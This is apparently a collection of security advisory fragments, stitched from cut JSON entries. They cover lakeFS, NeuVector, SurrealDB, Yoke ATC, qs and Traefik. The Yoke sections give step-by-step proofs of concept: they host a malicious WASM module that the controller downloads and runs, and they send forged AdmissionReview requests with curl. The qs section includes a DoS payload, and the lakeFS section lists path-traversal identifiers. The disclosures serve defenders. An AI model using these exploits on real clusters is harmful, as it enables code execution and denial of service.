Prefix Bypass Vulnerability\n\nThe `verifyRelPath` function used `strings.HasPrefix()` to verify that requested paths fall within the configured storage directory. This check was insufficient because it validated only the path prefix without requiring a path separator, allowing access to sibling directories with similar names.\n\n**Example:** If the adapter is configured with base path `/data/lakefs`:\n\n| Path | Expected | Actual |\n|------|----------|--------|\n| `/data/lakefs/valid/file.txt` | Allowed | Allowed |\n| `/data/lakefs_evil/secret.txt` | Blocked | **Vulnerable** |\n| `/data/lakefs_backup/data.db` | Blocked | **Vulnerable** |\n\n### 2. Namespace Escape via Identifier\n\nThe adapter verified that resolved paths stayed within the adapter's base path, but did not verify that object identifiers stayed within their designated storage namespace. This allowed attackers to use path traversal sequences in the object identifier to access files in other namespaces.\n\n**Example:** With base path `/data/lakefs` and namespace `local://repo1/userdata`:\n\n| Identifier | Resolved Path | Expected | Actual |\n|------------|---------------|----------|--------|\n| `file.txt` | `/data/lakefs/repo1/userdata/file.txt` | Allowed | Allowed |\n| `../secrets/key.txt` | `/data/lakefs/repo1/secrets/key.txt` | Blocked | **Vulnerable** |\n| `../../other-repo/data.txt` | `/data/lakefs/other-repo/data.txt` | Blocked | **Vulnerable** |\n\nThis vulnerability allows users with access to one namespace to read and write files in other namespaces within the same lakeFS deployment.\n\n## Impact\n\nAuthenticated lakeFS users can:\n\n- **Read and write files in sibling directories** that share the same path prefix as the storage directory (vulnerability 1)\n- **Access files across namespaces** by using path traversal in object identifiers (vulnerability 2)\n\nThis could allow attackers to:\n\n- Read sensitive data from other repositories/namespaces\n- Write malicious files to other namespaces\n- Read/write files in adjacent directories outside lakeFS storage\n- Potentially escalate privileges if writable directories are used by other services\n\nThis vulnerability **only affects** deployments using the local block adapter. Deployments using S3, GCS, Azure, or other object storage backends are **not affected**.\n\n## Patches\n\nFixed in version v1.77.0.\n\nThe fixes:\n1. Append a path separator to prefix checks, ensuring paths must be within the storage directory\n2. Add two-level path validation: verify both that namespace paths stay within the adapter's base path AND that resolved paths stay within their designated namespace\n\n## Workarounds\n\n- Configure the storage path with a unique name unlikely to be a prefix of other directories\n- Restrict filesystem permissions for the lakeFS process\n- Ensure no sensitive data exists in sibling directories\n\n## Credit\n\nDiscovered via CodeQL static analysis.",

          "html": "### Impact\nA vulnerability has been identified in the NeuVector scanner where the scanner process accepts registry and controller credentials as command-line arguments, potentially exposing sensitive credentials to local users. This may allow unauthorized access to registries or the NeuVector controller, potentially enabling image manipulation, information disclosure, or further lateral movement within the environment.\n\n**Important:**\n- For the exposure of credentials not related to Rancher NeuVector, the final impact severity for confidentiality, integrity and availability is dependent on the permissions the leaked credentials have on their services.\n- It is recommended to review for potentially leaked credentials in this scenario and to change them if deemed necessary.\n\nPlease consult the associated [MITRE ATT&CK – Technique – Credential Access and Unsecured Credentials](https://attack.mitre.org/techniques/T1552/) for further information about this category of attack.\n\n### Patches\nPatched versions include release `v4.072` and above.\n\nStarting from version `v4.072`, the scanner monitor process does not pass credentials to the scanner anymore. Instead, scanner process gets credentials information from environment variables, preventing them from being exposed through `/proc/*/cmdline`.\n\n### Workarounds\nThere is no workaround for this issue. Users are recommended to upgrade, as soon as possible, to a version of NeuVector scanner that contains the fix.\n\n### References\nIf you have any questions or comments about this advisory:\n- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n- Open an issue in the [NeuVector](https://github.com/neuvector/neuvector/issues/new/choose) repository.\n- Verify with our [support matrix](https://www.suse.com/suse-neuvector/support-matrix/all-supported-versions/neuvector-v-all-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/#suse-security).",

An attacker with the ability to manipulate database records (e.g., via SQL injection or compromised admin access) could inject malicious serialized objects containing arbitrary closures, leading to Remote Code Execution (RCE) when the magic link is visited.\n\n## Resolution\n\nThe vulnerability has been mitigated through HMAC-signed serialization using the application key, class allowlisting restricted to `ActionAbstract` subclasses and framework classes, strict type validation preventing arbitrary object storage, and backward compatibility support for legacy data via `allowed_classes` in `unserialize()`. Implementation includes a new [Serializable](src/Security/Serializable/Serializable.php) security class with signing/verification, refactored getter/setter methods in MagicLink.",

The SurrealDB instance terminates instantly, requiring a manual restart.\n\nThe query consists of using built-in string functions to construct a large string and passing it to the JavaScript runtime for compilation. The exact string size required to trigger the crash varies between SurrealDB versions.\n\nWhilst exploiting the vulnerability requires users to be able to run arbitrary queries, if guest access (`--allow-guests`), is enabled, then guests can perform this attack.\n\n### Impact\n\nAny user able to execute queries on a SurrealDB instance with scripting enabled (`--allow-scripting`) can cause complete denial of service. The server process terminates immediately without graceful shutdown.\n\nThe underlying cause of the vulnerability is a null pointer dereference in the `QuickJS-NG` v0.8 JavaScript engine, this vulnerability cannot be exploited to execute arbitrary code, or compromise the integrity or confidentiality of data. \n\n### Patches\n\nVersions prior to SurrealDB `v2.6.1` and `v3.0.0-beta.3` are vulnerable.\n\nThe patches for SurrealDB `v2.6.1` and `v3.0.0-beta.3` update the `rquickjs` dependency from `v0.9.0` to `v0.11.0`, which in turn uses an updated version of `QuickJS-NG`.\n\n### Workarounds\nDeny execution of embedded scripting functions through the configuration of [capabilities](https://surrealdb.com/docs/surrealdb/security/capabilities#capabilities) by starting SurrealDB with the `--deny-scripting` flag or the equivalent environment variable `SURREAL_CAPS_DENY_SCRIPT=true`. This has a usability implication, although scripting functions are disabled by default.\n\nAdministrators can also use `--deny-arbitrary-query`  to deny arbitrary querying by either `guest`, `record` or `system` users, or a combination of those, with impacts to functionality for those users. \n\n### Links ###\n[SurrealDB Documentation - Capabilities](https://surrealdb.com/docs/surrealdb/security/capabilities)\n[SurrealDB Documentation - Guest Access](https://surrealdb.com/docs/surrealdb/security/capabilities#guest-access)\n[SurrealQL Documentation - Scripting Functions](https://surrealdb.com/docs/surrealql/functions/script)\n[quickjs-ng v0.9 Release Notes](https://github.com/quickjs-ng/quickjs/releases/tag/v0.9.0)\nhttps://github.com/surrealdb/surrealdb/pull/6833\nhttps://github.com/surrealdb/surrealdb/pull/6774",

          "html": "# Arbitrary WASM Code Execution via AnnotationOverrideFlight Injection in Yoke ATC\n\nThis vulnerability exists in the Air Traffic Controller (ATC) component of Yoke, a Kubernetes deployment tool. It allows users with CR create/update permissions to execute arbitrary WASM code in the ATC controller context by injecting a malicious URL through the `overrides.yoke.cd/flight` annotation. The ATC controller downloads and executes the WASM module without proper URL validation, enabling attackers to create arbitrary Kubernetes resources or potentially escalate privileges to cluster-admin level.\n\n**Recommended CWE**: CWE-94 (Improper Control of Generation of Code - Code Injection)\n\n## Summary\n\nYoke ATC allows users to override the Flight WASM module URL via the `overrides.yoke.cd/flight` annotation on Custom Resources. The controller only checks if the user has `update` permission on `airways` resources but does not validate the WASM URL source. An attacker with CR create/update permissions can inject a malicious WASM URL, causing the ATC controller to download and execute arbitrary code.\n\n## Details\n\nThe vulnerability exists in two code paths:\n\n**Source Point - Annotation Definition** (`pkg/flight/flight.go:41-42`):\n```go\nconst (\n    AnnotationOverrideFlight = \"overrides.yoke.cd/flight\"\n    AnnotationOverrideMode   = \"overrides.yoke.cd/mode\"\n)\n```\n\n**Sink Point 1 - Admission Webhook** (`cmd/atc/handler.go:298-300`):\n```go\nif overrideURL, _, _ := unstructured.NestedString(cr.Object, \"metadata\", \"annotations\", flight.AnnotationOverrideFlight); overrideURL != \"\" {\n    xhttp.AddRequestAttrs(r.Context(), slog.Group(\"overrides\", \"flight\", overrideURL))\n    takeoffParams.Flight.Path = overrideURL  // User-provided URL used directly\n}\n```\n\n**Sink Point 2 - Reconciler** (`internal/atc/reconciler_instance.go:264-269`):\n```go\nif overrideURL, _, _ := unstructured.NestedString(resource.Object, \"metadata\", \"annotations\", flight.AnnotationOverrideFlight); overrideURL != \"\" {\n    ctrl.Logger(ctx).Warn(\"using override module\", \"url\", overrideURL)\n    // Simply set the override URL as the flight path and let yoke load and execute the wasm module\n    takeoffParams.Flight.Path = overrideURL  // User-provided URL used directly without validation\n}\n```\n\nThe permission check at `cmd/atc/handler.go:160-177` only verifies `update` permission on `airways` resources, not the ability to execute arbitrary WASM code:\n```go\naccessReview, err := params.Client.Clientset.AuthorizationV1().SubjectAccessReviews().Create(\n    r.Context(),\n    &authorizationv1.SubjectAccessReview{\n        Spec: authorizationv1.SubjectAccessReviewSpec{\n            ResourceAttributes: &authorizationv1.ResourceAttributes{\n                Verb:     \"update\",\n                Group:    \"yoke.cd\",\n                Version:  \"v1alpha1\",\n                Resource: \"airways\",  // Only checks airway update permission\n            },\n        },\n    },\n)\n```\n\n## PoC\n\n### Environment Setup\n\n**Prerequisites**:\n- Docker installed and running\n- kubectl installed\n- Go 1.21+ installed\n- kind installed\n\n**Step 1: Create Kind cluster**\n```bash\ncat > /tmp/kind-config.yaml << 'EOF'\nkind: Cluster\napiVersion: kind.x-k8s.io/v1alpha4\nname: yoke-vuln-test\nnodes:\n- role: control-plane\nEOF\n\nkind create cluster --config /tmp/kind-config.yaml\n```\n\n**Step 2: Build and install Yoke CLI**\n```bash\n# Clone yoke repository\ngit clone https://github.com/yokecd/yoke.git\ncd yoke\n\n# Build yoke CLI (patch version if needed for compatibility)\nGOPROXY=direct GOSUMDB=off go build -o /tmp/yoke ./cmd/yoke\n\n# Verify installation\n/tmp/yoke version\n```\n\nExpected output:\n```\n╭───────────────────────────────┬──────────╮\n│ yoke                          │ v0.18.0  │\n│ toolchain                     │ go1.25.6 │\n│ k8s.io/client-go              │ v0.34.1  │\n│ github.com/tetratelabs/wazero │ v1.6.0   │\n╰───────────────────────────────┴──────────╯\n```\n\n**Step 3: Deploy ATC**\n```bash\n/tmp/yoke takeoff --create-namespace --namespace atc -wait 120s atc oci://ghcr.io/yokecd/atc-installer:latest\n```\n\nExpected output:\n```\nCluster-access not granted: enable cluster-access to reuse existing TLS certificates.\nGenerating TLS certificates, this may take a second...\nFinished generating TLS certificates.\n---\nsuccessful takeoff of atc\n```\n\n**Step 4: Verify ATC deployment and permissions**\n```bash\nkubectl get pods -n atc\nkubectl get clusterrolebinding | grep atc\n```\n\nExpected output:\n```\nNAME                       READY   STATUS    RESTARTS   AGE\natc-atc-6d4bcb7665-wvqkt   1/1     Running   0          22s\n\natc-atc-cluster-role-binding   ClusterRole/cluster-admin   22s\n```\n\n**Step 5: Deploy Backend Airway example**\n```bash\n/tmp/yoke takeoff -wait 60s backendairway \"https://github.com/yokecd/examples/releases/download/latest/atc_backend_airway.wasm.gz\"\n```\n\nExpected output:\n```\nsuccessful takeoff of backendairway\n```\n\n### Exploitation Steps\n\n**Step 1: Create malicious WASM module**\n\nCreate `malicious-wasm.go`:\n```go\n// Malicious WASM module for VUL-001 vulnerability verification\npackage main\n\nimport (\n    \"encoding/json\"\n    \"fmt\"\n)\n\nfunc main() {\n    // Create a ConfigMap to prove arbitrary code execution\n    resource := map[string]interface{}{\n        \"apiVersion\": \"v1\",\n        \"kind\":       \"ConfigMap\",\n        \"metadata\": map[string]interface{}{\n            \"name\":      \"stolen-credentials\",\n            \"namespace\": \"default\",\n            \"labels\": map[string]string{\n                \"vulnerability\": \"VUL-001\",\n                \"type\":          \"exfiltrated-token\",\n            },\n        },\n        \"data\": map[string]string{\n            \"vulnerability\": \"VUL-001: AnnotationOverrideFlight Injection allows arbitrary WASM execution\",\n            \"proof\":         \"This ConfigMap was created by malicious WASM code\",\n        },\n    }\n\n    resources := []interface{}{resource}\n    output, _ := json.Marshal(resources)\n    fmt.Println(string(output))\n}\n```\n\nCompile to WASM:\n```bash\nGOOS=wasip1 GOARCH=wasm go build -o malicious.wasm ./malicious-wasm.go\n```\n\n**Step 2: Host malicious WASM**\n```bash\npython3 -m http.server 8888 &\n```\n\n**Step 3: Get host IP accessible from Kind cluster**\n```bash\nHOST_IP=$(ip addr show docker0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)\necho \"Malicious WASM URL: http://${HOST_IP}:8888/malicious.wasm\"\n```\n\n**Step 4: Create malicious Backend CR**\n```bash\nMALICIOUS_URL=\"http://${HOST_IP}:8888/malicious.wasm\"\n\nkubectl apply -f -

This proves arbitrary code execution in the ATC controller context.\n\n## Impact\n\n**Vulnerability Type**: Remote Code Execution (RCE) / Code Injection\n\n**Attack Prerequisites**:\n- Attacker has permission to create/update Custom Resources managed by Yoke ATC\n- Network access to host malicious WASM (can be external URL)\n\n**Impact Assessment**:\n- **Confidentiality**: High - Attacker can create resources to exfiltrate data; if ClusterAccess is enabled, can read cluster secrets via host functions\n- **Integrity**: High - Attacker can create/modify arbitrary Kubernetes resources through WASM output\n- **Availability**: Medium - Attacker can disrupt cluster operations by creating malicious resources\n\n**Attack Scenario**:\n1. CI/CD developer or application developer with CR permissions creates a Backend CR with malicious annotation\n2. ATC controller downloads and executes attacker-controlled WASM\n3. Malicious WASM creates backdoor resources or exfiltrates sensitive data\n4. If ClusterAccess is enabled, attacker can read secrets and escalate to cluster-admin\n\n## Severity\n\n**CVSS v3.1 Score**: 8.8 (High)\n\n**Vector**: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\n\n- Attack Vector (AV): Network - Malicious WASM can be hosted externally\n- Attack Complexity (AC): Low - Simple annotation injection\n- Privileges Required (PR): Low - Only CR create/update permission needed\n- User Interaction (UI): None - Automatic execution on CR creation\n- Scope (S): Unchanged - Impact within ATC controller context\n- Confidentiality (C): High - Can access controller context data\n- Integrity (I): High - Can create arbitrary resources\n- Availability (A): High - Can disrupt cluster operations\n\n## Affected Versions\n\n- Yoke ATC v0.18.x and earlier versions\n- All versions that support the `overrides.yoke.cd/flight` annotation\n\n## Patched Versions\n\nNo patch available at time of disclosure.\n\n## Workarounds\n\n1. **Disable annotation override feature**: Remove or disable the `overrides.yoke.cd/flight` annotation processing in production environments\n\n2. **Network policy**: Restrict ATC controller's outbound network access to prevent downloading external WASM modules\n\n3. **RBAC hardening**: Limit CR create/update permissions to trusted users only\n\n4. **Admission webhook**: Deploy a validating webhook to reject CRs with `overrides.yoke.cd/flight` annotations\n\n## References\n\n- Yoke Project: https://github.com/yokecd/yoke\n- Yoke ATC Documentation: https://yokecd.github.io/docs/airtrafficcontroller/atc/\n- CWE-94: Improper Control of Generation of Code: https://cwe.mitre.org/data/definitions/94.html\n\n## Credits\n\ncredit for:\n@b0b0haha (603571786@qq.com)\n@lixingquzhi (mayedoushidalao@163.com)",

Any client that can reach the ATC service within the cluster can send requests directly to these endpoints, bypassing the Kubernetes API Server's authentication and authorization mechanisms.\n\n## Details\n\nThe vulnerability exists in the HTTP handler implementation where webhook endpoints accept and process requests without verifying the client identity.\n\n**Vulnerable Endpoint Handlers** (`cmd/atc/handler.go:147-335`):\n```go\nmux.HandleFunc(\"POST /validations/{airway}\", func(w http.ResponseWriter, r *http.Request) {\n    var review admissionv1.AdmissionReview\n    if err := json.NewDecoder(r.Body).Decode(&review); err != nil {\n        http.Error(w, fmt.Sprintf(\"failed to decode review: %v\", err), http.StatusBadRequest)\n        return\n    }\n    // No authentication check - request is processed directly\n    // ...\n})\n```\n\n**Additional Unauthenticated Endpoints**:\n- `/validations/resources` (`cmd/atc/handler.go:337-538`)\n- `/validations/external-resources` (`cmd/atc/handler.go:540-597`)\n- `/validations/airways.yoke.cd` (`cmd/atc/handler.go:599-636`)\n- `/validations/flights.yoke.cd` (`cmd/atc/handler.go:638-733`)\n- `/crdconvert/{airway}` (`cmd/atc/handler.go:61-145`)\n\nThe code lacks:\n1. TLS client certificate verification\n2. Request source validation (verifying requests come from kube-apiserver)\n3. Any form of authentication middleware\n\n## PoC\n\n### Environment Setup\n\n**Prerequisites**:\n- Docker installed and running\n- kubectl installed\n- Go 1.21+ installed\n- kind installed\n\n**Step 1: Create Kind cluster**\n```bash\ncat > /tmp/kind-config.yaml << 'EOF'\nkind: Cluster\napiVersion: kind.x-k8s.io/v1alpha4\nname: yoke-vuln-test\nnodes:\n- role: control-plane\nEOF\n\nkind create cluster --config /tmp/kind-config.yaml\n```\n\n**Step 2: Build and install Yoke CLI**\n```bash\ngit clone https://github.com/yokecd/yoke.git\ncd yoke\nGOPROXY=direct GOSUMDB=off go build -o /tmp/yoke ./cmd/yoke\n```\n\n**Step 3: Deploy ATC**\n```bash\n/tmp/yoke takeoff --create-namespace --namespace atc -wait 120s atc oci://ghcr.io/yokecd/atc-installer:latest\n```\n\n**Step 4: Deploy Backend Airway example**\n```bash\n/tmp/yoke takeoff -wait 60s backendairway \"https://github.com/yokecd/examples/releases/download/latest/atc_backend_airway.wasm.gz\"\n```\n\n### Exploitation Steps\n\n**Step 1: Create attacker pod**\n```bash\nkubectl apply -f - <<EOF\napiVersion: v1\nkind: Pod\nmetadata:\n  name: webhook-attacker\n  namespace: default\nspec:\n  containers:\n  - name: attacker\n    image: curlimages/curl:latest\n    command: [\"sleep\", \"infinity\"]\nEOF\n\nkubectl wait --for=condition=Ready pod/webhook-attacker --timeout=60s\n```\n\n**Step 2: Probe webhook endpoints from attacker pod**\n```bash\nkubectl exec webhook-attacker -- curl -k -s -w \"\\nHTTP_CODE: %{http_code}\" \\\n  -X POST https://atc-atc.atc.svc.cluster.local:80/validations/resources \\\n  -H \"Content-Type: application/json\" -d '{}'\n```\n\nActual output from verification:\n```\npanic\n\nHTTP_CODE: 500\n```\n\nThe HTTP 500 response (not 401/403) indicates the endpoint is accessible without authentication. The error is due to invalid request body format, not authentication failure.\n\n**Step 3: Send crafted AdmissionReview request**\n\nCreate malicious request file:\n```bash\ncat > /tmp/malicious-review.json << 'EOF'\n{\n  \"apiVersion\": \"admission.k8s.io/v1\",\n  \"kind\": \"AdmissionReview\",\n  \"request\": {\n    \"uid\": \"vul002-exploit-uid\",\n    \"kind\": {\"group\": \"examples.com\", \"version\": \"v1\", \"kind\": \"Backend\"},\n    \"resource\": {\"group\": \"examples.com\", \"version\": \"v1\", \"resource\": \"backends\"},\n    \"name\": \"exploit-backend\",\n    \"namespace\": \"default\",\n    \"operation\": \"CREATE\",\n    \"userInfo\": {\"username\": \"attacker-from-pod\", \"groups\": [\"system:unauthenticated\"]},\n    \"object\": {\n      \"apiVersion\": \"examples.com/v1\",\n      \"kind\": \"Backend\",\n      \"metadata\": {\"name\": \"exploit-backend\", \"namespace\": \"default\"},\n      \"spec\": {\"image\": \"nginx:latest\", \"replicas\": 1}\n    }\n  }\n}\nEOF\n\nkubectl cp /tmp/malicious-review.json webhook-attacker:/tmp/malicious-review.json\n```\n\nSend the request:\n```bash\nkubectl exec webhook-attacker -- curl -k -s -X POST \\\n  https://atc-atc.atc.svc.cluster.local:80/validations/backends.examples.com \\\n  -H \"Content-Type: application/json\" \\\n  -d @/tmp/malicious-review.json\n```\n\nActual output from verification:\n```json\n{\"kind\":\"AdmissionReview\",\"apiVersion\":\"admission.k8s.io/v1\",\"request\":{\"uid\":\"vul002-normal-test\",\"kind\":{\"group\":\"examples.com\",\"version\":\"v1\",\"kind\":\"Backend\"},\"resource\":{\"group\":\"examples.com\",\"version\":\"v1\",\"resource\":\"backends\"},\"name\":\"vul002-normal-backend\",\"namespace\":\"default\",\"operation\":\"CREATE\",\"userInfo\":{\"username\":\"attacker-from-pod\",\"groups\":[\"system:unauthenticated\"]},\"object\":{\"apiVersion\":\"examples.com/v1\",\"kind\":\"Backend\",\"metadata\":{\"name\":\"vul002-normal-backend\",\"namespace\":\"default\"},\"spec\":{\"image\":\"nginx:latest\",\"replicas\":1}},\"oldObject\":null,\"options\":null},\"response\":{\"uid\":\"vul002-normal-test\",\"allowed\":false,\"status\":{\"metadata\":{},\"status\":\"Failure\",\"message\":\"applying resource returned errors during dry-run...\"}}}\n```\n\n**Step 4: Verify ATC logs**\n```bash\nkubectl logs -n atc deployment/atc-atc --tail=20 | grep backends.examples.com\n```\n\nActual log output:\n```json\n{\"time\":\"2026-02-01T15:29:08.890991543Z\",\"level\":\"INFO\",\"msg\":\"request served\",\"component\":\"server\",\"code\":200,\"method\":\"POST\",\"path\":\"/validations/backends.examples.com\",\"elapsed\":\"435ms\",\"validation\":{\"allowed\":false,\"status\":\"Invalid\"}}\n```\n\nThe `elapsed: 435ms` indicates WASM module execution occurred.\n\n### Expected Result\n\nThe attacker pod successfully sends AdmissionReview requests directly to the ATC webhook endpoint without any authentication. The ATC controller processes the request and executes the WASM module, proving that:\n1. No TLS client certificate is required\n2. No request source validation occurs\n3. The fake `userInfo` is accepted without verification\n4. WASM modules are executed based on unauthenticated requests\n\n## Impact\n\n**Vulnerability Type**: Missing Authentication / Authentication Bypass\n\n**Attack Prerequisites**:\n- Attacker has access to a pod within the cluster network\n- Network policies do not restrict access to the ATC service (common in default configurations)\n\n**Impact Assessment**:\n- **Confidentiality**: Medium - Attacker can trigger WASM execution which may access controller context data\n- **Integrity**: High - Combined with VUL-001, attacker can create arbitrary Kubernetes resources\n- **Availability**: Medium - Attacker can cause resource exhaustion through repeated requests\n\n**Attack Scenario**:\n1. Attacker compromises a pod or gains access to the cluster network\n2. Attacker sends crafted AdmissionReview requests directly to ATC webhook\n3. ATC processes requests without verifying they came from the API Server\n4. Combined with annotation injection (VUL-001), attacker can execute arbitrary WASM code\n5. Malicious WASM can create resources or exfiltrate data using ATC's cluster-admin privileges\n\n## Severity\n\n**CVSS v3.1 Score**: 7.5 (High)\n\n**Vector**: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N\n\n- Attack Vector (AV): Network - Accessible from cluster network\n- Attack Complexity (AC): Low - Simple HTTP request\n- Privileges Required (PR): None - No authentication required\n- User Interaction (UI): None - Automatic processing\n- Scope (S): Unchanged\n- Confidentiality (C): None - Direct impact limited\n- Integrity (I): High - Can trigger unauthorized WASM execution\n- Availability (A): None - No direct availability impact\n\nNote: When combined with VUL-001, the overall impact increases significantly.\n\n## Affected Versions\n\n- Yoke ATC v0.18.x and earlier versions\n- All versions that implement Admission Webhook endpoints without client authentication\n\n## Patched Versions\n\nNo patch available at time of disclosure.\n\n## Workarounds\n\n1. **Network Policy**: Deploy NetworkPolicy to restrict access to ATC service, allowing only kube-apiserver to connect\n```yaml\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: atc-webhook-policy\n  namespace: atc\nspec:\n  podSelector:\n    matchLabels:\n      yoke.cd/app: atc\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - namespaceSelector:\n        matchLabels:\n          kubernetes.io/metadata.name: kube-system\n      podSelector:\n        matchLabels:\n          component: kube-apiserver\n```\n\n2. **Service Mesh**: Use a service mesh (Istio, Linkerd) to enforce mTLS between services\n\n3. **Pod Security**: Implement strict pod security policies to limit which pods can be created in the cluster\n\n## References\n\n- Yoke Project: https://github.com/yokecd/yoke\n- Kubernetes Admission Webhooks: https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/\n- CWE-306: Missing Authentication for Critical Function: https://cwe.mitre.org/data/definitions/306.html\n\n## Credits\ncredit for:\n@b0b0haha (603571786@qq.com)\n@lixingquzhi (mayedoushidalao@163.com)",

          "html": "### Summary\nThe `arrayLimit` option in qs does not enforce limits for comma-separated values when `comma: true` is enabled, allowing attackers to cause denial-of-service via memory exhaustion. This is a bypass of the array limit enforcement, similar to the bracket notation bypass addressed in GHSA-6rw7-vpxm-498p (CVE-2025-15284).\n\n### Details\nWhen the `comma` option is set to `true` (not the default, but configurable in applications), qs allows parsing comma-separated strings as arrays (e.g., `?param=a,b,c` becomes `['a', 'b', 'c']`). However, the limit check for `arrayLimit` (default: 20) and the optional throwOnLimitExceeded occur after the comma-handling logic in `parseArrayValue`, enabling a bypass. This permits creation of arbitrarily large arrays from a single parameter, leading to excessive memory allocation.\n\n**Vulnerable code** (lib/parse.js: lines ~40-50):\n```js\nif (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) {\n    return val.split(',');\n}\n\nif (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n    throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n}\n\nreturn val;\n```\nThe `split(',')` returns the array immediately, skipping the subsequent limit check. Downstream merging via `utils.combine` does not prevent allocation, even if it marks overflows for sparse arrays.This discrepancy allows attackers to send a single parameter with millions of commas (e.g., `?param=,,,,,,,,...`), allocating massive arrays in memory without triggering limits. It bypasses the intent of `arrayLimit`, which is enforced correctly for indexed (`a[0]=`) and bracket (`a[]=`) notations (the latter fixed in v6.14.1 per GHSA-6rw7-vpxm-498p).\n\n### PoC\n**Test 1 - Basic bypass:**\n```\nnpm install qs\n```\n\n```js\nconst qs = require('qs');\n\nconst payload = 'a=' + ','.repeat(25);  // 26 elements after split (bypasses arrayLimit: 5)\nconst options = { comma: true, arrayLimit: 5, throwOnLimitExceeded: true };\n\ntry {\n  const result = qs.parse(payload, options);\n  console.log(result.a.length);  // Outputs: 26 (bypass successful)\n} catch (e) {\n  console.log('Limit enforced:', e.message);  // Not thrown\n}\n```\n**Configuration:**\n- `comma: true`\n- `arrayLimit: 5`\n- `throwOnLimitExceeded: true`\n\nExpected: Throws \"Array limit exceeded\" error.\nActual: Parses successfully, creating an array of length 26.\n\n\n### Impact\nDenial of Service (DoS) via memory exhaustion.\n\n### Suggested Fix\nMove the `arrayLimit` check before the comma split in `parseArrayValue`, and enforce it on the resulting array length. Use `currentArrayLength` (already calculated upstream) for consistency with bracket notation fixes.\n\n**Current code** (lib/parse.js: lines ~40-50):\n```js\nif (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) {\n    return val.split(',');\n}\n\nif (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n    throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n}\n\nreturn val;\n```\n\n**Fixed code:**\n```js\nif (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) {\n    const splitArray = val.split(',');\n    if (splitArray.length > options.arrayLimit - currentArrayLength) {  // Check against remaining limit\n        if (options.throwOnLimitExceeded) {\n            throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n        } else {\n            // Optionally convert to object or truncate, per README\n            return splitArray.slice(0, options.arrayLimit - currentArrayLength);\n        }\n    }\n    return splitArray;\n}\n\nif (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n    throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n}\n\nreturn val;\n```\nThis aligns behavior with indexed and bracket notations, reuses `currentArrayLength`, and respects `throwOnLimitExceeded`. Update README to note the consistent enforcement.",

          "html": "## Impact\n\nThere is a potential vulnerability in Traefik managing STARTTLS requests. \n\nAn unauthenticated client can bypass Traefik entrypoint `respondingTimeouts.readTimeout` by sending the 8-byte Postgres SSLRequest (STARTTLS) prelude and then stalling, causing connections to remain open indefinitely, leading to a denial of service. \n\n## Patches\n\n- https://github.com/traefik/traefik/releases/tag/v3.6.8\n\n## For more information\n\nIf you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).\n\n<details>\n<summary>Original Description</summary>\n\n### Summary\nA remote, unauthenticated client can bypass Traefik entrypoint `respondingTimeouts.readTimeout` by sending the 8-byte Postgres SSLRequest (STARTTLS) prelude and then stalling, causing connections to remain open indefinitely and enabling file-descriptor and goroutine exhaustion denial of service.\n\nThis triggers during protocol detection **before routing**, so it is reachable on an entrypoint even when **no Postgres/TCP routers are configured** (the PoC uses only an HTTP router).\n\n### Details\nTraefik applies per-connection deadlines based on `entryPoints.<name>.transport.respondingTimeouts.readTimeout` to prevent protocol detection and request reads from blocking forever (see `pkg/server/server_entrypoint_tcp.go`, which sets `SetReadDeadline` on accepted connections).\n\nHowever, in the TCP router protocol detection path (`pkg/server/router/tcp/router.go`), when Traefik detects the Postgres STARTTLS signature on a new connection, it executes a fast-path that clears deadlines:\n\n- detect Postgres SSLRequest (8-byte signature),\n- call `conn.SetDeadline(time.Time{})` (clears all deadlines),\n- then enter the Postgres STARTTLS handler (`servePostgres`).\n\nThe Postgres handler (`pkg/server/router/tcp/postgres.go`) then blocks waiting for a TLS ClientHello via the same peeking logic used elsewhere (`clientHelloInfo(br)`), but with deadlines removed. An attacker can therefore:\n\n1. connect to any internet-exposed TCP entrypoint,\n2. send the Postgres SSLRequest (SSL negotiation request),\n3. receive Traefik’s single-byte response (`S`),\n4. stop sending any further bytes.\n\n\nEach such connection remains open past the configured `readTimeout` (indefinitely), consuming a goroutine and a file descriptor until Traefik hits process limits.\n\n_Of note_: CVE-2026-22045 fixed a conceptually-similar DoS where a protocol-specific fast path cleared connection deadlines and then could block in TLS handshake processing, allowing unauthenticated clients to tie up goroutines/FDs indefinitely. This report is the same failure mode, but triggered via the Postgres STARTTLS detection path.\n\nTested versions:\n- `v3.6.7`\n- `master` at commit `a4a91344edcdd6276c1b766ca19ee3f0e346480f` \n\n### PoC\nPrerequisites:\n- Linux host\n- Python 3\n- A prebuilt Traefik `v3.6.7` binary.

